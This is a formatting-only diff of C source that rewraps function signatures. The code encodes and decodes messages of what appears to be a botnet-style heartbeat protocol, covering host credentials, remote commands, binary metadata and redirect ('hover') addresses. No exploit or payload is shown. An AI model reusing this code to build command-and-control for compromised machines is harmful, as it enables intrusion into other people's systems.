@@ -74,25 +74,39 @@ bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b) {
 	return memcmp(a->addr, b->addr, l) == 0;
 }
 
-void prne_net_ep_tosin4 (const prne_net_endpoint_t *ep, struct sockaddr_in *out) {
+void prne_net_ep_tosin4 (
+	const prne_net_endpoint_t *ep,
+	struct sockaddr_in *out)
+{
 	memcpy(&out->sin_addr, ep->addr.addr, 4);
 	out->sin_family = AF_INET;
 	out->sin_port = htons(ep->port);
 }
 
-void prne_net_ep_tosin6 (const prne_net_endpoint_t *ep, struct sockaddr_in6 *out) {
+void prne_net_ep_tosin6 (
+	const prne_net_endpoint_t *ep,
+	struct sockaddr_in6 *out)
+{
 	memcpy(&out->sin6_addr, ep->addr.addr, 16);
 	out->sin6_family = AF_INET6;
 	out->sin6_port = htons(ep->port);
 }
 
-bool prne_net_ep_set_ipv4 (const char *str, const uint16_t port, prne_net_endpoint_t *out) {
+bool prne_net_ep_set_ipv4 (
+	const char *str,
+	const uint16_t port,
+	prne_net_endpoint_t *out)
+{
 	out->port = port;
 	out->addr.ver = PRNE_IPV_4;
 	return inet_pton(AF_INET, str, &out->addr.addr) != 0;
 }
 
-bool prne_net_ep_set_ipv6 (const char *str, const uint16_t port, prne_net_endpoint_t *out) {
+bool prne_net_ep_set_ipv6 (
+	const char *str,
+	const uint16_t port,
+	prne_net_endpoint_t *out)
+{
 	out->port = port;
 	out->addr.ver = PRNE_IPV_6;
 	return inet_pton(AF_INET6, str, &out->addr.addr) != 0;
@@ -106,7 +120,10 @@ void prne_htbt_init_msg_head (prne_htbt_msg_head_t *mh) {
 
 void prne_htbt_free_msg_head (prne_htbt_msg_head_t *mh) {}
 
-bool prne_htbt_eq_msg_head (const prne_htbt_msg_head_t *a, const prne_htbt_msg_head_t *b) {
+bool prne_htbt_eq_msg_head (
+	const prne_htbt_msg_head_t *a,
+	const prne_htbt_msg_head_t *b)
+{
 	return
 		a->id == b->id &&
 		a->op == b->op &&
@@ -120,7 +137,10 @@ void prne_htbt_init_status (prne_htbt_status_t *s) {
 
 void prne_htbt_free_status (prne_htbt_status_t *s) {}
 
-bool prne_htbt_eq_status (const prne_htbt_status_t *a, const prne_htbt_status_t *b) {
+bool prne_htbt_eq_status (
+	const prne_htbt_status_t *a,
+	const prne_htbt_status_t *b)
+{
 	return
 		a->code == b->code &&
 		a->err == b->err;
@@ -131,7 +151,11 @@ void prne_init_host_cred (prne_host_cred_t *hc) {
 	hc->pw = NULL;
 }
 
-bool prne_alloc_host_cred (prne_host_cred_t *hc, const uint8_t id_len, const uint8_t pw_len) {
+bool prne_alloc_host_cred (
+	prne_host_cred_t *hc,
+	const uint8_t id_len,
+	const uint8_t pw_len)
+{
 	char *id, *pw;
 
 	id = prne_alloc_str(id_len);
@@ -165,7 +189,12 @@ bool prne_eq_host_cred (const prne_host_cred_t *a, const prne_host_cred_t *b) {
 		prne_nstreq(a->pw, b->pw);
 }
 
-prne_htbt_ser_rc_t prne_enc_host_cred (uint8_t *data, const size_t len, size_t *actual, const prne_host_cred_t *in) {
+prne_htbt_ser_rc_t prne_enc_host_cred (
+	uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	const prne_host_cred_t *in)
+{
 	const size_t id_len = prne_nstrlen(in->id);
 	const size_t pw_len = prne_nstrlen(in->pw);
 
@@ -185,7 +214,11 @@ prne_htbt_ser_rc_t prne_enc_host_cred (uint8_t *data, const size_t len, size_t *
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_dec_host_cred (const uint8_t *data, const size_t len, prne_host_cred_t *out) {
+prne_htbt_ser_rc_t prne_dec_host_cred (
+	const uint8_t *data,
+	const size_t len,
+	prne_host_cred_t *out)
+{
 	size_t id_len, pw_len;
 	char *id, *pw, *end;
 
@@ -217,7 +250,10 @@ void prne_htbt_init_host_info (prne_htbt_host_info_t *hi) {
 	hi->arch = PRNE_ARCH_NONE;
 }
 
-bool prne_htbt_alloc_host_info (prne_htbt_host_info_t *hi, const size_t cred_len) {
+bool prne_htbt_alloc_host_info (
+	prne_htbt_host_info_t *hi,
+	const size_t cred_len)
+{
 	void *ny_mem;
 
 	if (cred_len > 255) {
@@ -245,7 +281,10 @@ void prne_htbt_free_host_info (prne_htbt_host_info_t *hi) {
 	hi->host_cred_len = 0;
 }
 
-bool prne_htbt_eq_host_info (const prne_htbt_host_info_t *a, const prne_htbt_host_info_t *b) {
+bool prne_htbt_eq_host_info (
+	const prne_htbt_host_info_t *a,
+	const prne_htbt_host_info_t *b)
+{
 	return
 		a->parent_uptime == b->parent_uptime &&
 		a->child_uptime == b->child_uptime &&
@@ -269,7 +308,11 @@ void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd) {
 	cmd->detach = false;
 }
 
-bool prne_htbt_alloc_cmd (prne_htbt_cmd_t *cmd, const size_t argc, const size_t *args_len) {
+bool prne_htbt_alloc_cmd (
+	prne_htbt_cmd_t *cmd,
+	const size_t argc,
+	const size_t *args_len)
+{
 	size_t i, str_size, pos, mem_len;
 	char *mem = NULL;
 	char **args = NULL;
@@ -412,7 +455,10 @@ void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb) {
 	prne_htbt_free_cmd(&nb->cmd);
 }
 
-bool prne_htbt_eq_bin_meta (const prne_htbt_bin_meta_t *a, const prne_htbt_bin_meta_t *b) {
+bool prne_htbt_eq_bin_meta (
+	const prne_htbt_bin_meta_t *a,
+	const prne_htbt_bin_meta_t *b)
+{
 	return
 		a->bin_size == b->bin_size &&
 		prne_htbt_eq_cmd(&a->cmd, &b->cmd);
@@ -424,7 +470,10 @@ void prne_htbt_init_hover (prne_htbt_hover_t *ho) {
 
 void prne_htbt_free_hover (prne_htbt_hover_t *ho) {}
 
-bool prne_htbt_eq_hover (const prne_htbt_hover_t *a, const prne_htbt_hover_t *b) {
+bool prne_htbt_eq_hover (
+	const prne_htbt_hover_t *a,
+	const prne_htbt_hover_t *b)
+{
 	return
 		memcmp(a->v4.addr, b->v4.addr, 4) == 0 &&
 		memcmp(a->v6.addr, b->v6.addr, 16) == 0 &&
@@ -445,14 +494,22 @@ void prne_htbt_init_stdio (prne_htbt_stdio_t *s) {
 
 void prne_htbt_free_stdio (prne_htbt_stdio_t *s) {}
 
-bool prne_htbt_eq_stdio (const prne_htbt_stdio_t *a, const prne_htbt_stdio_t *b) {
+bool prne_htbt_eq_stdio (
+	const prne_htbt_stdio_t *a,
+	const prne_htbt_stdio_t *b)
+{
 	return
 		a->len == b->len &&
 		a->err == b->err &&
 		a->fin == b->fin;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_msg_head (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_msg_head_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_msg_head (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_msg_head_t *in)
+{
 	uint16_t id;
 
 	*actual = 3;
@@ -474,7 +531,12 @@ prne_htbt_ser_rc_t prne_htbt_ser_msg_head (uint8_t *mem, const size_t mem_len, s
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_status (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_status_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_status (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_status_t *in)
+{
 	*actual = 5;
 
 	if (mem_len < *actual) {
@@ -490,7 +552,12 @@ prne_htbt_ser_rc_t prne_htbt_ser_status (uint8_t *mem, const size_t mem_len, siz
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_host_info (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_host_info_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_host_info (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_host_info_t *in)
+{
 	if (in->host_cred_len > 255) {
 		return PRNE_HTBT_SER_RC_FMT_ERR;
 	}
@@ -554,7 +621,12 @@ prne_htbt_ser_rc_t prne_htbt_ser_host_info (uint8_t *mem, const size_t mem_len, 
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_hover (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_hover_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_hover (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_hover_t *in)
+{
 	*actual = 24;
 	if (mem_len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
@@ -570,9 +642,17 @@ prne_htbt_ser_rc_t prne_htbt_ser_hover (uint8_t *mem, const size_t mem_len, size
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_cmd (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_cmd_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_cmd (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_cmd_t *in)
+{
 	if (in->mem_len > 0) {
-		if (in->mem_len > PRNE_HTBT_ARG_MEM_MAX || in->argc == 0 || in->mem[in->mem_len - 1] != 0) {
+		if (in->mem_len > PRNE_HTBT_ARG_MEM_MAX ||
+			in->argc == 0 ||
+			in->mem[in->mem_len - 1] != 0)
+		{
 			return PRNE_HTBT_SER_RC_FMT_ERR;
 		}
 	}
@@ -589,7 +669,12 @@ prne_htbt_ser_rc_t prne_htbt_ser_cmd (uint8_t *mem, const size_t mem_len, size_t
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_bin_meta_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_bin_meta_t *in)
+{
 	*actual = in->cmd.mem_len + 5;
 
 	if (mem_len < *actual) {
@@ -606,7 +691,12 @@ prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (uint8_t *mem, const size_t mem_len, s
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_ser_stdio (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_stdio_t *in) {
+prne_htbt_ser_rc_t prne_htbt_ser_stdio (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_stdio_t *in)
+{
 	*actual = 2;
 	if (in->len > PRNE_HTBT_STDIO_LEN_MAX) {
 		return PRNE_HTBT_SER_RC_FMT_ERR;
@@ -625,7 +715,12 @@ prne_htbt_ser_rc_t prne_htbt_ser_stdio (uint8_t *mem, const size_t mem_len, size
 }
 
 
-prne_htbt_ser_rc_t prne_htbt_dser_msg_head (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_msg_head_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_msg_head (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_msg_head_t *out)
+{
 	*actual = 3;
 
 	if (len < *actual) {
@@ -639,7 +734,12 @@ prne_htbt_ser_rc_t prne_htbt_dser_msg_head (const uint8_t *data, const size_t le
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_dser_status (uint8_t *data, const size_t len, size_t *actual, prne_htbt_status_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_status (
+	uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_status_t *out)
+{
 	*actual = 5;
 
 	if (len < *actual) {
@@ -652,7 +752,12 @@ prne_htbt_ser_rc_t prne_htbt_dser_status (uint8_t *data, const size_t len, size_
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_dser_host_info (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_host_info_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_host_info (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_host_info_t *out)
+{
 	size_t cred_size;
 
 	*actual = 94;
@@ -731,7 +836,12 @@ prne_htbt_ser_rc_t prne_htbt_dser_host_info (const uint8_t *data, const size_t l
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_dser_hover (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_hover_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_hover (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_hover_t *out)
+{
 	*actual = 24;
 	if (*actual > len) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
@@ -745,7 +855,12 @@ prne_htbt_ser_rc_t prne_htbt_dser_hover (const uint8_t *data, const size_t len, 
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_dser_cmd (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_cmd_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_cmd (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_cmd_t *out)
+{
 	size_t args_len, argc;
 	char **args = NULL;
 	char *mem = NULL;
@@ -806,7 +921,12 @@ END:
 	return ret;
 }
 
-prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_bin_meta_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_bin_meta_t *out)
+{
 	size_t chain_actual;
 	prne_htbt_ser_rc_t ret;
 
@@ -825,7 +945,12 @@ prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (const uint8_t *data, const size_t le
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-prne_htbt_ser_rc_t prne_htbt_dser_stdio (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_stdio_t *out) {
+prne_htbt_ser_rc_t prne_htbt_dser_stdio (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_stdio_t *out)
+{
 	*actual = 2;
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
@@ -838,7 +963,14 @@ prne_htbt_ser_rc_t prne_htbt_dser_stdio (const uint8_t *data, const size_t len, 
 	return PRNE_HTBT_SER_RC_OK;
 }
 
-char **prne_htbt_parse_args (char *m_args, const size_t args_size, const size_t add_argc, char **add_args, size_t *argc, const size_t max_args) {
+char **prne_htbt_parse_args (
+	char *m_args,
+	const size_t args_size,
+	const size_t add_argc,
+	char **add_args,
+	size_t *argc,
+	const size_t max_args)
+{
 	char *ptr, *end = m_args + args_size, *next;
 	size_t i, cnt;
 	char **ret;
